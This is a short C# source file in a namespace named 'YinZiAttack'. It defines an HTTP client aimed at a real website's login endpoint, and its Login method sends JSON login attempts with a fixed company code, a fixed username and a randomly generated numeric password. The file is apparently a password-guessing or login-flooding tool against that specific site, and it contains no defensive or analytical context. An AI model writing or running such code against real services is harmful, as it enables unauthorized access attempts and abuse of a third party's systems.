using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;

namespace YinZiAttack
{
    public class YinZiHttp:StHttp
    {
        public YinZiHttp():
            base("http://www.cheyinz.cn/")
        {

        }
        public void Login()
        {
            YinZiLoginModel yinZiLoginModel = YinZiLoginModel.CreateRandom("cc");
            StringContent stringContent = new StringContent(yinZiLoginModel.ToJson());
            stringContent.Headers.ContentType = new MediaTypeHeaderValue("application/json");
            string result = base.Post("login", stringContent);

        }
        public class YinZiLoginModel
        {
            private static Random random = new Random();
            public string CompanyCode { get; set; }
            public string UserName { get; set; }
            public string Password { get; set; }
            public static YinZiLoginModel CreateRandom(string companyCode)
            {
                YinZiLoginModel yinZiLoginModel = new YinZiLoginModel();
                yinZiLoginModel.CompanyCode = companyCode;
                yinZiLoginModel.UserName = "lcy";
                yinZiLoginModel.Password = random.Next(0, int.MaxValue).ToString();
                return yinZiLoginModel;
            }
            public string ToJson()
            {
                string result = JsonConvert.SerializeObject(this);
                return result;
            }
        }
    }
}
